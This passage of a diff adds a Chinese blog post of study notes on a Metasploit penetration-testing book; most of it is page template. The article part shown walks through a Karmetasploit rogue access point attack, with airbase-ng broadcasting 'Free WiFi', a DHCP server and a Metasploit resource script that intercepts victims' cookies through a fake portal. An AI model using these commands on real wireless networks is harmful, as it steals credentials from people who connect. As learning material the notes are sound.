class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输入命令 cp &#x2F;etc&#x2F;dhcp3&#x2F;dhcpd.conf &#x2F;etc&#x2F;dhcp3&#x2F;dhcp.conf.back备份文档，下载KARMA源文件，<code>wget https://www.offsec.com/wp-content/uploads/2015/04/karma.rc_.txt</code>还需要打开网卡监听<code>airmon-ng start wlan0</code></p>
+</li>
+<li><p>开始攻击</p>
+<p><code>airbase-ng -P -C 30 -e &quot;Free WiFi&quot; -v mon0</code></p>
+<p>-P 响应所有的探测器，-C 30 每30秒发出信号，-v 调试模型</p>
+<p>接下来打开at0接口并运行DHCP服务。</p>
+<p><code>ifconfig at0 up 10.0.0.1 netmask 255.255.255.0</code></p>
+<p><code>dhcpd3 -cf /etc/dhcp3/dhcpd.conf at0</code></p>
+<p>我们可以在MSF中使用rource karma.rc命令加载源文件，或者msfconsole -r karma.rc传递</p>
+</li>
+<li><p>获取凭证</p>
+<p>当客户端连接我们的恶意AP时，我们追踪的消息文件会告诉我们什么时候IP地址被分配了。</p>
+</li>
+<li><p>得到Shell</p>
+<p>在用户浏览网页时，一个伪造的门户页面呈现给了用户，显示的是Loading，因为Karmetasploit正在设置截获cookies，设置虚假邮件，DNS和其他网络服务等。你也可以定制网页，给用户你想看到的。</p>
+</li>
+</ol>
+<hr>
+<p>后面章节内容为如何编写一个Metasploit叫脚本，因为暂时我还不会Ruby语言，所以后面的内容如果感兴趣的话请自己去学习哦。</p>
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          Donate
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>Copyright： </strong>
+          
+          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://h-limbus.github.io/2023/05/17/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0/" rel="tag">学习</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2023/05/26/%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF-%E7%AC%AC%E4%B8%80%E7%AB%A0%20Web%E5%85%A5%E9%97%A8/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            从0到1：CTFer成长之路-第一章 Web入门
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2023/05/15/web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97--%E7%AC%AC%E5%85%AD%E7%AB%A0%EF%BC%88PowerShell%20%E6%94%BB%E5%87%BB%EF%BC%89/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">0x04 PowerShell 攻击</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.staticfile.org/valine/1.4.16/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "ypvGgRhcfezE3aedvYAO6oYo-gzGzoHsz",
+    app_key: "K7VGmo5vDtIxdtx0uAelYpSN",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "秀儿请上座~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+  
+    
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2023
+        <i class="ri-heart-fill heart_icon"></i> Limbus
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="https://cdn.jsdelivr.net/gh/H-Limbus/h-limbus.github.io@latest/images/logo.png" alt="Limbus&#39; Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/photography">摄影</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/2023/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯茶吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/H-Limbus/h-limbus.github.io@latest/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/H-Limbus/h-limbus.github.io@latest/images/wechat.png">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+ 
+<script src="/js/clickBoom2.js"></script>
+ 
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
